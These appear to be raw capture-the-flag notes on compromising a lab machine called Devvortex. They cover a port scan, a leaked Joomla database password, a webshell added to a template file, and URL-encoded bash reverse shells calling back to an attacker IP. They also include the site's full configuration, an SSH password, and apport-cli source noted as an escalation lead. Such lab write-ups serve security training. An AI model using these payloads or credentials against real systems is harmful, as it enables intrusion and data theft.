
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 04:57 CDT
Nmap scan report for devvortex.htb (10.129.68.190)
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.03 seconds


10.129.68.190 devvortex.htb dev.devvortex.htb


dev.devvortex.htb  :  directories 
/administrator 


lewis 
"password":"P4ntherg0t1n5r3c0n##"

email 
lewis@devvortex.htb

{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}


after editing error.php file in Templates 

GET /templates/cassiopeia/error.php?cmd=cat%20/../../../../../../../etc/passwd HTTP/1.1

cmd is possible hmm 

"/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/"10.10.14.88"/5678%200>&1'"

"/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.88/5678%200>&1'"

/bin/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/"10.10.14.88"/5678%200>&1'


changing the php file in templates and then  (php-reverse-shell)
if I go there using burp suite 
it is found that I can get into the system inside 


/var/www/dev.devvortex.htb/templates/cassiopeia

```php
<?php
class JConfig {
	public $offline = false;
	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
	public $display_offline_message = 1;
	public $offline_image = '';
	public $sitename = 'Development';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = 20;
	public $access = 1;
	public $debug = false;
	public $debug_lang = false;
	public $debug_lang_const = true;
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'lewis';
	public $password = 'P4ntherg0t1n5r3c0n##';
	public $db = 'joomla';
	public $dbprefix = 'sd4fg_';
	public $dbencryption = 0;
	public $dbsslverifyservercert = false;
	public $dbsslkey = '';
	public $dbsslcert = '';
	public $dbsslca = '';
	public $dbsslcipher = '';
	public $force_ssl = 0;
	public $live_site = '';
	public $secret = 'ZI7zLTbaGKliS9gq';
	public $gzip = false;
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
	public $offset = 'UTC';
	public $mailonline = true;
	public $mailer = 'mail';
	public $mailfrom = 'lewis@devvortex.htb';
	public $fromname = 'Development';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = false;
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = 25;
	public $caching = 0;
	public $cache_handler = 'file';
	public $cachetime = 15;
	public $cache_platformprefix = false;
	public $MetaDesc = '';
	public $MetaAuthor = true;
	public $MetaVersion = false;
	public $robots = '';
	public $sef = true;
	public $sef_rewrite = false;
	public $sef_suffix = false;
	public $unicodeslugs = false;
	public $feed_limit = 10;
	public $feed_email = 'none';
	public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
	public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
	public $lifetime = 15;
	public $session_handler = 'database';
	public $shared_session = false;
	public $session_metadata = true;

```


mysql -u lewis -p
password : P4ntherg0t1n5r3c0n##


ssh logan@10.10.68.190
(password) tequieromucho 


[interesting point]
/usr/bin/apport-cli

```python
#!/usr/bin/python3

'''Command line Apport user interface.'''

# Copyright (C) 2007 - 2009 Canonical Ltd.
# Author: Michael Hofmann <mh21@piware.de>
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the
# Free Software Foundation; either version 2 of the License, or (at your
# option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
# the full text of the license.

# Web browser support:
#    w3m, lynx: do not work
#    elinks: works

from __future__ import unicode_literals

import os.path, os, sys, subprocess, re, errno
import termios, tempfile

from apport import unicode_gettext as _
import apport.ui


class CLIDialog:
    '''Command line dialog wrapper.'''

    def __init__(self, heading, text):
        self.heading = '\n*** ' + heading + '\n'
        self.text = text
        self.keys = []
        self.buttons = []
        self.visible = False

    def raw_input_char(self, prompt, multi_char=False):
        '''raw_input, but read a single character unless multi_char is True.

        @param: prompt: the text presented to the user to solict a response.
        @param: multi_char: Boolean True if we need to read until <enter>.
        '''

        sys.stdout.write(prompt)
        sys.stdout.write(' ')
        sys.stdout.flush()

        file = sys.stdin.fileno()
        saved_attributes = termios.tcgetattr(file)
        attributes = termios.tcgetattr(file)
        attributes[3] = attributes[3] & ~(termios.ICANON)
        attributes[6][termios.VMIN] = 1
        attributes[6][termios.VTIME] = 0
        termios.tcsetattr(file, termios.TCSANOW, attributes)
        try:
            if multi_char:
                response = str(sys.stdin.readline()).strip()
            else:
                response = str(sys.stdin.read(1))
        finally:
            termios.tcsetattr(file, termios.TCSANOW, saved_attributes)

        sys.stdout.write('\n')
        return response

    def show(self):
        self.visible = True
        print(self.heading)
        if self.text:
            print(self.text)

    def run(self, prompt=None):
        if not self.visible:
            self.show()

        sys.stdout.write('\n')
        try:
            # Only one button
            if len(self.keys) <= 1:
                self.raw_input_char(_('Press any key to continue...'))
                return 0
            # Multiple choices
            while True:
                if prompt is not None:
                    print(prompt)
                else:
                    print(_('What would you like to do? Your options are:'))
                for index, button in enumerate(self.buttons):
                    print('  %s: %s' % (self.keys[index], button))

                if len(self.keys) <= 10:
                    # A 10 option prompt would can still be a single character
                    # response because the 10 options listed will be 1-9 and C.
                    # Therefore there are 10 unique responses which can be
                    # given.
                    multi_char = False
                else:
                    multi_char = True
                response = self.raw_input_char(
                    _('Please choose (%s):') % ('/'.join(self.keys)),
                    multi_char)
                try:
                    return self.keys.index(response.upper()) + 1
                except ValueError:
                    pass
        except KeyboardInterrupt:
            sys.stdout.write('\n')
            sys.exit(1)

    def addbutton(self, button, hotkey=None):
        if hotkey:
            self.keys.append(hotkey)
            self.buttons.append(button)
        else:
            self.keys.append(re.search('&(.)', button).group(1).upper())
            self.buttons.append(re.sub('&', '', button))
        return len(self.keys)


class CLIProgressDialog(CLIDialog):
    '''Command line progress dialog wrapper.'''

    def __init__(self, heading, text):
        CLIDialog.__init__(self, heading, text)
        self.progresscount = 0

    def set(self, progress=None):
        self.progresscount = (self.progresscount + 1) % 5
        if self.progresscount:
            return

        if progress is not None:
            sys.stdout.write('\r%u%%' % (progress * 100))
        else:
            sys.stdout.write('.')
        sys.stdout.flush()


class CLIUserInterface(apport.ui.UserInterface):
    '''Command line Apport user interface'''

    def __init__(self):
        apport.ui.UserInterface.__init__(self)
        self.in_update_view = False

    def _get_details(self):
        '''Build report string for display.'''

        details = ''
        max_show = 1000000
        for key in sorted(self.report):
            # ignore internal keys
            if key.startswith('_'):
                continue
            details += '== %s =================================\n' % key
            # string value
            keylen = len(self.report[key])
            if not hasattr(self.report[key], 'gzipvalue') and \
                    hasattr(self.report[key], 'isspace') and \
                    not self.report._is_binary(self.report[key]) and \
                    keylen < max_show:
                s = self.report[key]
            elif keylen >= max_show:
                s = _('(%i bytes)') % keylen
            else:
                s = _('(binary data)')

            if isinstance(s, bytes):
                s = s.decode('UTF-8', errors='ignore')
            details += s
            details += '\n\n'

        return details

    def ui_update_view(self):
        self.in_update_view = True
        report = self._get_details()
        try:
            p = subprocess.Popen(['/usr/bin/sensible-pager'], stdin=subprocess.PIPE)
            p.communicate(report.encode('UTF-8'))
        except IOError as e:
            # ignore broken pipe (premature quit)
            if e.errno == errno.EPIPE:
                pass
            else:
                raise
        self.in_update_view = False

    #
    # ui_* implementation of abstract UserInterface classes
    #

    def ui_present_report_details(self, allowed_to_report=True, modal_for=None):
        dialog = CLIDialog(_('Send problem report to the developers?'),
                           _('After the problem report has been sent, please fill out the form in the\n'
                             'automatically opened web browser.'))

        complete = dialog.addbutton(_('&Send report (%s)') %
                                    self.format_filesize(self.get_complete_size()))

        if self.can_examine_locally():
            examine = dialog.addbutton(_('&Examine locally'))
        else:
            examine = None

        view = dialog.addbutton(_('&View report'))
        save = dialog.addbutton(_('&Keep report file for sending later or copying to somewhere else'))
        ignore = dialog.addbutton(_('Cancel and &ignore future crashes of this program version'))

        dialog.addbutton(_('&Cancel'))

        while True:
            response = dialog.run()

            return_value = {'restart': False, 'blacklist': False, 'remember': False,
                            'report': False, 'examine': False}
            if response == examine:
                return_value['examine'] = True
                return return_value
            elif response == complete:
                return_value['report'] = True
            elif response == ignore:
                return_value['blacklist'] = True
            elif response == view:
                self.collect_info()
                self.ui_update_view()
                continue
            elif response == save:
                # we do not already have a report file if we report a bug
                if not self.report_file:
                    prefix = 'apport.'
                    if 'Package' in self.report:
                        prefix += self.report['Package'].split()[0] + '.'
                    (fd, self.report_file) = tempfile.mkstemp(prefix=prefix, suffix='.apport')
                    with os.fdopen(fd, 'wb') as f:
                        self.report.write(f)

                print(_('Problem report file:') + ' ' + self.report_file)

            return return_value

    def ui_info_message(self, title, text):
        dialog = CLIDialog(title, text)
        dialog.addbutton(_('&Confirm'))
        dialog.run()

    def ui_error_message(self, title, text):
        dialog = CLIDialog(_('Error: %s') % title, text)
        dialog.addbutton(_('&Confirm'))
        dialog.run()

    def ui_start_info_collection_progress(self):
        self.progress = CLIProgressDialog(
            _('Collecting problem information'),
            _('The collected information can be sent to the developers to improve the\n'
              'application. This might take a few minutes.'))
        self.progress.show()

    def ui_pulse_info_collection_progress(self):
        self.progress.set()

    def ui_stop_info_collection_progress(self):
        sys.stdout.write('\n')

    def ui_start_upload_progress(self):
        self.progress = CLIProgressDialog(
            _('Uploading problem information'),
            _('The collected information is being sent to the bug tracking system.\n'
              'This might take a few minutes.'))
        self.progress.show()

    def ui_set_upload_progress(self, progress):
        self.progress.set(progress)

    def ui_stop_upload_progress(self):
        sys.stdout.write('\n')

    def ui_question_yesno(self, text):
        '''Show a yes/no question.

        Return True if the user selected "Yes", False if selected "No" or
        "None" on cancel/dialog closing.
        '''
        dialog = CLIDialog(text, None)
        r_yes = dialog.addbutton('&Yes')
        r_no = dialog.addbutton('&No')
        r_cancel = dialog.addbutton(_('&Cancel'))
        result = dialog.run()
        if result == r_yes:
            return True
        if result == r_no:
            return False
        assert result == r_cancel
        return None

    def ui_question_choice(self, text, options, multiple):
        '''Show an question with predefined choices.

        options is a list of strings to present. If multiple is True, they
        should be check boxes, if multiple is False they should be radio
        buttons.

        Return list of selected option indexes, or None if the user cancelled.
        If multiple == False, the list will always have one element.
        '''
        result = []
        dialog = CLIDialog(text, None)

        if multiple:
            while True:
                dialog = CLIDialog(text, None)
                index = 0
                choice_index_map = {}
                for option in options:
                    if index not in result:
                        choice_index_map[dialog.addbutton(option, str(index + 1))] = index
                    index += 1
                done = dialog.addbutton(_('&Done'))
                cancel = dialog.addbutton(_('&Cancel'))

                if result:
                    cur = ', '.join([str(r + 1) for r in result])
                else:
                    cur = _('none')
                response = dialog.run(_('Selected: %s. Multiple choices:') % cur)
                if response == cancel:
                    return None
                if response == done:
                    break
                result.append(choice_index_map[response])

        else:
            # single choice (radio button)
            dialog = CLIDialog(text, None)
            index = 1
            for option in options:
                dialog.addbutton(option, str(index))
                index += 1

            cancel = dialog.addbutton(_('&Cancel'))
            response = dialog.run(_('Choices:'))
            if response == cancel:
                return None
            result.append(response - 1)

        return result

    def ui_question_file(self, text):
        '''Show a file selector dialog.

        Return path if the user selected a file, or None if cancelled.
        '''
        print('\n***  ' + text)
        while True:
            sys.stdout.write(_('Path to file (Enter to cancel):'))
            sys.stdout.write(' ')
            f = sys.stdin.readline().strip()
            if not f:
                return None
            if not os.path.exists(f):
                print(_('File does not exist.'))
            elif os.path.isdir(f):
                print(_('This is a directory.'))
            else:
                return f

    def open_url(self, url):
        text = '%s\n\n  %s\n\n%s' % (
            _('To continue, you must visit the following URL:'),
            url,
            _('You can launch a browser now, or copy this URL into a browser on another computer.'))

        answer = self.ui_question_choice(text, [_('Launch a browser now')], False)
        if answer == [0]:
            apport.ui.UserInterface.open_url(self, url)

    def ui_run_terminal(self, command):
        # we are already running in a terminal, so this works by definition
        if not command:
            return True

        subprocess.call(command, shell=True)


if __name__ == '__main__':
    app = CLIUserInterface()
    if not app.run_argv():
        print(_('No pending crash reports. Try --help for more information.'))

```
